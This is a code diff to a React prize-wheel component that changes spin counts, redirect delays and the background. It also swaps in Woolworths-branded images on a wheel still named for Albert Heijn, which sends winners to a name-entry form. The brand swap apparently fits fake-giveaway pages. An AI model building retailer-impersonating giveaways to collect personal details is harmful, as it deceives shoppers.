@@ -32,7 +32,7 @@ type SessionRecord = {
 };
 
 const ANGLE_OFFSET = 0;
-const MIN_FULL_SPINS = 6;
+const MIN_FULL_SPINS = 9;
 const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
 const MAX_HISTORY_ITEMS = 5;
 const WHEEL_CURRENCY = "AUD$";
@@ -223,11 +223,9 @@ export function WheelClient({
 
       const restoredPrize = getPrizeFromSession(nextSession);
       if (restoredPrize && nextSession.current_step === "win") {
-        setResultPrize(restoredPrize);
-        setTimeout(() => {
-          router.push(`/win/${effectiveRouteSessionId}`);
-        }, 400);
-      }
+      setResultPrize(restoredPrize);
+      setTimeout(() => { router.push(`/win/${effectiveRouteSessionId}`); }, 1200);
+    }
     }
 
     void loadSession();
@@ -336,7 +334,7 @@ export function WheelClient({
     // Çark durduktan sonra popup göstermeden direkt form sayfasına (isim soyisim) yönlendir
     setTimeout(() => {
       router.push(`/win/${effectiveRouteSessionId}`);
-    }, 700); // Kullanıcının çarkın nerede durduğunu görebilmesi için kısa bir gecikme
+    }, 1800); // Kullanıcının çarkın nerede durduğunu görebilmesi için kısa bir gecikme
   };
 
   const spinWheel = () => {
@@ -389,7 +387,7 @@ export function WheelClient({
   return (
     <>
       <div
-        className="relative w-full overflow-hidden bg-[#050505]"
+        className="relative w-full overflow-hidden bg-[#07160F]"
         style={{
           height: "100dvh",
           minHeight: "100dvh",
@@ -399,20 +397,18 @@ export function WheelClient({
           paddingLeft: "env(safe-area-inset-left)",
         }}
       >
-        {!isViewportReady ? (
-          <picture aria-hidden="true" className="absolute inset-0 block">
-            <source media="(max-width: 767px)" srcSet="/wheel-assets/mobile/background-opaque.png" />
-            <img
-              src="/wheel-assets/desktop/background-opaque.png"
-              alt=""
-              className="h-full w-full object-cover"
-              draggable={false}
-              loading="eager"
-              decoding="async"
-              fetchPriority="high"
-            />
-          </picture>
-        ) : null}
+        <picture aria-hidden="true" className="absolute inset-0 block">
+          <source media="(max-width: 767px)" srcSet="/woolworths/portal/mobile-background-clean.png" />
+          <img
+            src="/woolworths/portal/desktop-background-clean.png"
+            alt=""
+            className="h-full w-full object-cover"
+            draggable={false}
+            loading="eager"
+            decoding="async"
+            fetchPriority="high"
+          />
+        </picture>
 
         {activeLayout ? (
           <AlbertHeijnWheel
